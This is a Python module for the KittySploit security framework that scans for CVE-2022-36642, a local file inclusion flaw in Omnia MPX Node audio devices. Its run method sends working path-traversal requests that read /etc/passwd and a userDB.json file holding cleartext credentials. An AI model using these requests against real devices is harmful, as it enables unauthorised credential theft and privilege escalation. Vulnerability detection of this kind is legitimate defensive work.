#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Telos Alliance Omnia MPX Node through 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Omnia MPX 1.5.0+r1 - Local File Inclusion Detection',
        'description': 'Telos Alliance Omnia MPX Node through 1.5.0+r1 is vulnerable to local file inclusion via logs/downloadMainLog. By retrieving userDB.json allows an attacker to retrieve cleartext credentials and escalate privileges via the control panel.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'traversal', 'omnia', 'edb', 'lfi', 'telosalliance', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50996',
            'https://cyber-guy.gitbook.io/cyber-guy/pocs/omnia-node-mpx-auth-bypass-via-lfd',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-36642',
            'https://www.telosalliance.com/radio-processing/audio-interfaces/omnia-mpx-node',
        ],
        'cve': 'CVE-2022-36642',
    }

    def run(self):
        for path in ('/logs/downloadMainLog?fname=../../../../../../..//etc/passwd', '/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('"username":', '"password":', '"mustChangePwd":', '"roleUser":',)
            body_regexes = ('root:[x*]:0:0',)
            if (all(m in body for m in body_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='critical',
                    reason="Omnia MPX 1.5.0+r1 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

